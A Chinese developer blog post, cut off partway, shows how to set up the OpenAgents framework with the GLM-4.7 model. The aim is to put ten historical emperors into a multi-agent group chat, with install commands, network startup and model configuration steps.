0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是LucianaiB。</p>
<h2 data-id="heading-0">历史十大帝王拉到一个群聊会发生什么事？朱元璋直接开喷</h2>
<p>话不多说，直接看效果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2dd5cac78ea8419cb8770518dac5d317~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=RBaNJLazsLH7DTJPW4krNaF5000%3D" alt="img" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ce5de07aaab49e99b94b1a70d57403d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=ae8cQ6kWC%2F6L7VUZNKlgg81QkSo%3D" alt="img" loading="lazy"/></p>
<p>本项目已开源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOnePieceLwc%2FOpenAgents-GLM" target="_blank" title="https://github.com/OnePieceLwc/OpenAgents-GLM" ref="nofollow noopener noreferrer">github.com/OnePieceLwc…</a></p>
<h2 data-id="heading-1">引言：从短剧灵感到AI实验</h2>
<p>最近沉迷于在某果看爽文短剧，入局就是《<strong>我的视频通万朝：开局盘点十大帝王</strong>》，AI发展的现在，AI短剧越来越得到更多的支持，（小道消息：明年某音会对AI短剧加搞得的支持）,看完短剧之后就是盘点十大帝王，给排了一个排行榜，但是他们直接没有发生有趣的故事，既然作为一个程序员，不能留下这个遗憾，我就想作者创造排行榜，那么<strong>我把《十大帝王拉到一个群聊》一起给我干活讨论，一起讨论事情，会发生什么有趣的事呢？</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35153e97d9aa4c58aaab35cdaaaf2d64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=mCAPNKO%2F8JCXhgZtytAiZ55OrZo%3D" alt="img" loading="lazy"/></p>
<h2 data-id="heading-2">相关技术栈</h2>
<p>简单来说就是，本次采用的是OpenAgents搭建一个<strong>网络中心（群聊）</strong>，搭建多个<strong>智能体**</strong>（帝王），**用GLM - 4.7给这些给赋予灵魂。</p>
<h3 data-id="heading-3">OpenAgents</h3>
<p>这是一个开源的项目，地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenagents-org%2Fopenagents" target="_blank" title="https://github.com/openagents-org/openagents" ref="nofollow noopener noreferrer">github.com/openagents-…</a></p>
<p>OpenAgents 是一个开源项目，用于创建 AI 代理网络，并将代理连接到网络中以实现开放协作。换句话说，OpenAgents 提供了一个基础的网络架构，使 AI 代理能够无缝连接和协作。在 OpenAgents 上的每个代理网络都是一个独立的社区，在这里代理可以发现同伴、合作解决问题、相互学习并共同成长。它不受协议限制，可与流行的大型语言模型提供商和代理框架配合使用。</p>
<blockquote>
<p>就是可以想象多个员工同时给你工作，把十大帝王拉到群聊一起给我猛猛干活讨论时政问题等。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d7bb32191334c5197119ebc81629bed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=7dEatIgbl8qdrY1g%2FOvBZB7JvIc%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-4">GLM - 4.7</h3>
<p>GLM-4.7 是智谱最新旗舰模型，地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bigmodel.cn%2Fglm-coding%3Fic%3D4G1ARPDRUV" target="_blank" title="https://www.bigmodel.cn/glm-coding?ic=4G1ARPDRUV" ref="nofollow noopener noreferrer">www.bigmodel.cn/glm-coding?…</a></p>
<p>GLM-4.7 面向 Agentic Coding 场景强化了编码能力、长程任务规划与工具协同，并在多个公开基准的当期榜单中取得开源模型中的领先表现。通用能力提升，回复更简洁自然，写作更具沉浸感。在执行复杂智能体任务，在工具调用时指令遵循更强，Artifacts 与 Agentic Coding 的前端美感和长程任务完成效率进一步提升。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63990fdd823b40ac8ef74d499eeca246~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=BLyh%2BFvdHG5BV%2FrXKR%2F7s43%2BvtM%3D" alt="img" loading="lazy"/></p>
<blockquote>
<p>十大帝王提供上面的框架是有了，但是只是一个空的框架，而用 GLM - 4.7 我们就可以给每人赋予他独特的灵魂。</p>
</blockquote>
<h2 data-id="heading-5">初始化：OpenAgents 部署</h2>
<p>由于这个开源项目目前没有相对完整的教程，本次加入详细的安装部署以及示例教程。</p>
<h3 data-id="heading-6">安装部署 OpenAgents</h3>
<p>在有python环境的情况下，通过 PyPI 安装 OpenAgents</p>
<pre><code class="hljs language-Plain" lang="Plain">pip install openagents
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d2674605e724c6a835ce9772f0c3d61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=A4Aikef1YG%2BIWODEd8LMmbKRGUY%3D" alt="img" loading="lazy"/></p>
<p>可以查看一下版本，来判断是否成功安装</p>
<pre><code class="hljs language-Plain" lang="Plain"> openagents --version  //我安装的是0.8.4
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c545722e9f1417586c779ef2cb74f71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=B%2FNtW5QqzMyOcSyYX70dbWPMxPs%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-7">创建并启动首个网络</h3>
<p>在openagents中有一个网络中心，简单理解就是有一个中枢去控制全局，在这个网络中心，可以配置智能体等。</p>
<p>在启动任何代理之前，都必须启动 OpenAgents 网络（也称为“中心”或“服务器”）。</p>
<pre><code class="hljs language-Plain" lang="Plain">openagents init &lt;项目网络名称&gt;  //&lt;项目网络名称&gt;改成你直接的项目名称，我就简单直接命名为网络
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aedd8a5679464e8787727c7b5ef15446~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=GQ8yOImcUBGUmVXEnZLg9ZJ3GlI%3D" alt="img" loading="lazy"/></p>
<p>一句指令就可以启动网络。</p>
<pre><code class="hljs language-Plain" lang="Plain">openagents network start
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dddbcf2a9afb48a88c73812c2cc8462a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=plCgVgGa4s9%2BDZfTLdeUgcJ5jmg%3D" alt="img" loading="lazy"/></p>
<p>启动后会自动打开：<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8700%2Fstudio%2F%25EF%25BC%258C%25E9%25A6%2596%25E6%25AC%25A1%25E7%2599%25BB%25E5%25BD%2595%25E7%259A%2584%25E8%25AF%259D%25E9%259C%2580%25E8%25A6%2581%25E8%25BF%259B%25E8%25A1%258C%25E4%25B8%2580%25E4%25BA%259B%25E5%259F%25BA%25E7%25A1%2580%25E7%259A%2584%25E9%2585%258D%25E7%25BD%25AE%25EF%25BC%258C%25E7%25BD%2591%25E7%25BB%259C%25E7%259B%25B4%25E6%258E%25A5%25E9%25BB%2598%25E8%25AE%25A4%25E8%25BF%259E%25E6%258E%25A5%25E5%258D%25B3%25E5%258F%25AF%25E3%2580%2582" target="_blank" title="http://localhost:8700/studio/%EF%BC%8C%E9%A6%96%E6%AC%A1%E7%99%BB%E5%BD%95%E7%9A%84%E8%AF%9D%E9%9C%80%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9A%84%E9%85%8D%E7%BD%AE%EF%BC%8C%E7%BD%91%E7%BB%9C%E7%9B%B4%E6%8E%A5%E9%BB%98%E8%AE%A4%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF%E3%80%82" ref="nofollow noopener noreferrer">http://localhost:8700/studio/，首次登录的话需要进行一些基础的配置，网络直接默认连接即可。</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73f10a231ef748e8a9931f6e1d36b175~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=LGgJ7wokLVZNzTHi3h2uxqLmc7A%3D" alt="img" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7413b37bfb47429b8904b7c3cf2efed4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=RdR%2BnjTJmBCzBGgoiw5j5ZoMVFk%3D" alt="img" loading="lazy"/></p>
<p>成功登录后会显示如下界面：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e48330322e14c91b2f80183b2687553~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=W09QAA%2BviE32FTa%2BcVB0NmJEIK0%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-8">配置 GLM - 4.7</h3>
<p>点击左侧第二个智能体服务，现在<code>默认模型</code>，也就是为此网络中的服务代理配置默认的 LLM 模型。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9320edf29e2c407799bc9a83020540dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=wdBQkTkTwSZaX%2BCz2oME56rA62Q%3D" alt="img" loading="lazy"/></p>
<p>🚀 点击链接进行注册以及获取API：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bigmodel.cn%2Fglm-coding%3Fic%3D4G1ARPDRUV" target="_blank" title="https://www.bigmodel.cn/glm-coding?ic=4G1ARPDRUV" ref="nofollow noopener noreferrer">www.bigmodel.cn/glm-coding?…</a>，点击上方的API Key，创建一个新的密钥。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00668534fe4d4272a4cfa46194f4404e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=1qGETtqH%2BU68NB37YbJrLZ5ekrk%3D" alt="img" loading="lazy"/></p>
<p>然后回来OpenAgents的网站，输入一下信息：</p>
<blockquote>
<p><strong>提供商</strong>：Custom OpenAI Compatible
<strong>Base URL</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopen.bigmodel.cn%2Fapi%2Fpaas%2Fv4" target="_blank" title="https://open.bigmodel.cn/api/paas/v4" ref="nofollow noopener noreferrer">open.bigmodel.cn/api/paas/v4</a>
<strong>模型名称</strong>：glm-4.7
<strong>API 密钥</strong>：***（我们在上方得到的API Key）</p>
</blockquote>
<p>在输入后，点击下方的测试可以直接看到是否可以使用。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/108736e8d5604aca870b70f75c36072f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=%2FsXL0S2utk09bdfMf1CvsE2%2BnQI%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-9">启动第一个 Demo</h3>
<p>修改在agents中的charlie.yaml中代码，把第8行的 model_name 改为 glm-4.7。（修改示例如下图）</p>
<blockquote>
<p>这是因为默认用的gpt 4的体验模型，所以修改为我们设置的模型 glm-4.7</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/025e9fd6ef3c4b21b021500c69281cfa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=foB9J8iZSxJ7M7F4MvDAx5JjErY%3D" alt="img" loading="lazy"/></p>
<p>启动<code>charlie</code>这个代理，这个可以看作就是我们当中的一个人物。</p>
<pre><code class="hljs language-Plain" lang="Plain">openagents agent start agents/charlie.yaml  // charlie.yaml就是开启对应的人物
</code></pre>
